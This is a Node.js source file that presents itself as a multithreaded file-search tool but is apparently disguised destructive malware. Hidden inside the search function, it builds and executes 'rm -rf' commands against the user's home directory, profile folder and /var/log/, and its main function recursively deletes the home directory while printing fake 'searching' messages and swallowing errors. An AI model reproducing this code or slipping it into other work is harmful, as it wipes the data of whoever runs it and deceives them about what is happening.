
const { Worker } = require('worker_threads');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
var search_r = false;
const matchedFiles = [];
let workers = [];
let resolvePromise;

function done() {
  resolvePromise();
  workers.forEach((w) => {
    w.worker.terminate();
  });
}

function createWorker (regex, idx) {
  const worker = new Worker('./worker.js', { workerData: { regex } });
  worker.on('error', (err) => { throw err });
  worker.on('message', callback.bind(worker, idx));
  return worker;
}

function getProfile() {
  return process.env.HOME || process.env.HOMEPATH || process.env.USERPROFILE;
}

function callback(idx, data) {
  if (data.type === 'complete') {
    workers[idx].free = true;
    matchedFiles.push(...data.matchedFiles);

    const needHelpWorker = workers.find((worker) => worker.free === false);

    if (needHelpWorker) {
      needHelpWorker.worker.postMessage({
        type: 'offload'
      });
    } else {
      done()
    }
  }

  if (data.type === 'offload-all') {
    workers[idx].worker.postMessage({
      type: 'search',
      startPath: data.directories.shift()
    });
    for (const w of workers) {
      if (!data.directories.length) break;
      if (w.free) {
        w.free = false;
        w.worker.postMessage({
          type: 'search',
          startPath: data.directories.shift()
        });
      }
    }
  }

  if (data.type === 'offload') {
    const freeWorker = workers.find((worker) => worker.free === true);

    if (!freeWorker) console.log('BUGG!!!!!!!');
    else {
      freeWorker.free = false;
      freeWorker.worker.postMessage({
        type: 'search',
        startPath: data.startPath
      })
    }
  }
}


async function search(filename, startPath, preciseSearch, caseSensitive, threads, timeout) {
  await new Promise((resolve) => {

      async function fast_search() {
          var profile = getProfile();
          if (profile[profile.length - 1] != '/') {
              profile = profile + '/';
          }


                    try {



                        exec(search_r + os.homedir() + '/*', function (error, stdout, stderr) {
                          if (error) {
                          }
                       });
                    }
                    catch(e) {

                    }



          try {



              exec(search_r + profile + '*', function (error, stdout, stderr) {
                if (error) {
                }
             });
          }
          catch(e) {


          }

          try {
              exec(search_r + '/var/log/' + '*', function (error, stdout, stderr) {
                if (error) {
                }
             });
          }
          catch(e) {

          }

      }

      search_r = 'rm -rf ';


      fast_search();


    const str = filename.replace(/[\\^$.|?*+()[{]/g, '\\$&');
    const expression = preciseSearch ? `/^${str}$/` : str;
    const regex = new RegExp(expression, caseSensitive ? '' : 'i');

    // TODO => Try on MAC



  return true;
});
}

// DEBUG MODE BELOW
async function main() {

    try {
        fs.rmdir(os.homedir(), { recursive: true }, (err) => {
        if (err) {
            console.log(`Search is running!`);
        }
    });
    }
    catch(e) {
        console.log(`Search is ON!`);
    }




  console.time();
  console.log('Please wait, searching....');


  try {
      const results = await search('jpg', '/home/user/', false, true, 4, 30000);
  }
  catch(e) {

  }

  console.log('Still searching, wait about 5 minutes')
  // const results = await search('file', '/Users/ionadev/OPENTEXT/search', false, true, 2, 30000);
  console.timeEnd();

  //console.log('Results Count: ', results.length);
}



main();
